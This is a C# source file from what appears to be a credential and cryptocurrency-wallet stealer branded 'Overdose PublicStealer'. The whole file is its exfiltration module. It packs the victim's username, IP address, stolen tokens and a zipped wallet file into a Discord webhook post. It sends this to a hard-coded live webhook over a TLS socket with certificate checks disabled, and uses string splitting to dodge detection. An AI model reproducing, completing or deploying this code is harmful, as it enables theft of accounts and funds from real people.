using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using DataHarvester.Utils;
using DataHarvester.Models;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Authentication;

namespace DataHarvester
{
    namespace Utils
    {
        public static class RC
        {
            public static readonly string USR = string.Join("", "Overdose".ToCharArray().Select(c => c).ToArray()) + " PublicStealer";
            public static readonly string RT = "💊 New " + string.Concat("Overdose", " PublicStealer") + " Report 💊";
            public static readonly string RD = "A new data " + "exfiltration" + " report has been generated.";
            public static readonly string AN = "Overdose " + "Stealer Automated" + " Report";
            public static readonly string FVU = "\uD83D\uDC64 Victim" + " Username";
            public static readonly string FVI = "\uD83C\uDF10 Victim" + " IP Address";
            public static readonly string FFT = "\uD83D\uDD11 Found" + " Tokens";
            public static readonly string FTNF = "No tokens" + " found.";
            public static readonly string FTP = "Token ";
            public static readonly string FTT = "... " + "(truncated)";
            public static readonly string FWA = "Wallet files" + " are attached.";
            public static readonly string FWNF = "No wallets" + " found.";
            public static readonly string FT = new string(new char[] { 'P', 'r', 'o', 'g', 'r', 'a', 'm', 'm', 'e', 'd' }) + " by Overdose";
            public static readonly string CAW = "Attaching " + "wallet file: ";
            public static readonly string CERW = "Error reading " + "wallet zip file for attachment: ";
            public static readonly string CWS = "Combined webhook" + " sent successfully.";
            public static readonly string CWE = "Error sending " + "combined webhook: ";
            public static readonly string CNE = "Network error " + "sending webhook: ";
            public static readonly string CSED = "Server error " + "details: ";
            public static readonly string CUE = "Unexpected error " + "sending webhook: ";
        }
    }

    internal static class ReportSender
    {
        private static readonly string wu = "https://discord.com" + "/api/webhooks/1378251265032716359/syeLM0yeQ4Fn3izjCbBJNR5US1cN8UXyqUQKZe8sGSE2-Xs9Yxfvy5WrnrZYOWIFkwyV";

        internal static async Task SendCombinedReport(List<string> tkns, string wzp)
        {
            var p = new WebhookPayload
            {
                Username = RC.USR,
                AvatarUrl = WebhookPayload.DefaultAvatarUrl,
                Embeds = new List<Embed>()
            };

            var e = new Embed
            {
                Title = RC.RT,
                Description = RC.RD,
                Color = 0x00FF00,
                Author = new EmbedAuthor { Name = RC.AN },
                Fields = new List<EmbedField>
                {
                    new EmbedField { Name = RC.FVU, Value = $"```{Environment.UserName}```", Inline = true },
                    new EmbedField { Name = RC.FVI, Value = $"```{NetworkUtils.GetIp()}```", Inline = true }
                },
                Footer = new EmbedFooter { Text = RC.FT, IconUrl = WebhookPayload.DefaultAvatarUrl },
                Timestamp = DateTimeOffset.UtcNow,
                Image = new EmbedImage { Url = WebhookPayload.DefaultEmbedImageUrl }
            };

            if (tkns != null && tkns.Any())
            {
                e.Fields.Add(new EmbedField { Name = RC.FFT, Value = $"{tkns.Count}", Inline = false });
                for (int i = 0; i < tkns.Count; i++)
                {
                    string tk = tkns[i];
                    if (tk.Length > 1000) tk = tk.Substring(0, 1000) + RC.FTT;
                    e.Fields.Add(new EmbedField
                    {
                        Name = $"{RC.FTP}{i + 1}",
                        Value = $"```{tk}```",
                        Inline = false
                    });
                }
            }
            else
            {
                e.Fields.Add(new EmbedField { Name = RC.FFT, Value = RC.FTNF, Inline = false });
            }

            if (!string.IsNullOrEmpty(wzp) && File.Exists(wzp))
            {
                e.Color = 0x3498DB;
                e.Fields.Add(new EmbedField { Name = "\uD83D\uDCC2 Wallets", Value = RC.FWA, Inline = false });
            }
            else
            {
                e.Fields.Add(new EmbedField { Name = "\uD83D\uDCC2 Wallets", Value = RC.FWNF, Inline = false });
            }

            p.Embeds.Add(e);
            string jp = JsonSerializer.Serialize(p);

            string h = "discord.com";
            string ph = "/api/webhooks/1378251265032716359/syeLM0yeQ4Fn3izjCbBJNR5US1cN8UXyqUQKZe8sGSE2-Xs9Yxfvy5WrnrZYOWIFkwyV";

            string b = "---------------------------" + DateTime.Now.Ticks.ToString("x");
            var sb = new StringBuilder();

            sb.AppendLine($"--{b}");
            sb.AppendLine("Content-Disposition: form-data; name=\"payload_json\"");
            sb.AppendLine("Content-Type: application/json; charset=utf-8");
            sb.AppendLine();
            sb.AppendLine(jp);

            byte[] bb = Encoding.UTF8.GetBytes(sb.ToString());

            byte[] fb = null;
            string fh = "";
            if (!string.IsNullOrEmpty(wzp) && File.Exists(wzp))
            {
                fb = File.ReadAllBytes(wzp);
                fh =
                    $"--{b}\r\n" +
                    $"Content-Disposition: form-data; name=\"wallet_file\"; filename=\"{Path.GetFileName(wzp)}\"\r\n" +
                    $"Content-Type: application/octet-stream\r\n\r\n";
            }

            byte[] fhb = Encoding.UTF8.GetBytes(fh);
            byte[] ebb = Encoding.UTF8.GetBytes($"\r\n--{b}--\r\n");

            int cl = bb.Length + (fb != null ? fhb.Length + fb.Length : 0) + ebb.Length;

            using (TcpClient c = new TcpClient())
            {
                await c.ConnectAsync(h, 443);

                using (SslStream s = new SslStream(c.GetStream(), false, (sender, cert, chain, errors) => true))
                {
                    await s.AuthenticateAsClientAsync(h);

                    var hd = $"POST {ph} HTTP/1.1\r\n" +
                             $"Host: {h}\r\n" +
                             "User-Agent: Discord-Client/1.0\r\n" +
                             $"Content-Type: multipart/form-data; boundary={b}\r\n" +
                             $"Content-Length: {cl}\r\n" +
                             "Connection: close\r\n\r\n";

                    byte[] hb = Encoding.ASCII.GetBytes(hd);
                    await s.WriteAsync(hb, 0, hb.Length);
                    await s.WriteAsync(bb, 0, bb.Length);

                    if (fb != null)
                    {
                        await s.WriteAsync(fhb, 0, fhb.Length);
                        await s.WriteAsync(fb, 0, fb.Length);
                    }

                    await s.WriteAsync(ebb, 0, ebb.Length);
                    await s.FlushAsync();

                    using (StreamReader r = new StreamReader(s, Encoding.UTF8))
                    {
                        string rs = await r.ReadToEndAsync();
                        Console.WriteLine(rs.Contains("204 No Content") ? RC.CWS : $"{RC.CWE}{rs}");
                    }
                }
            }
        }
    }
}
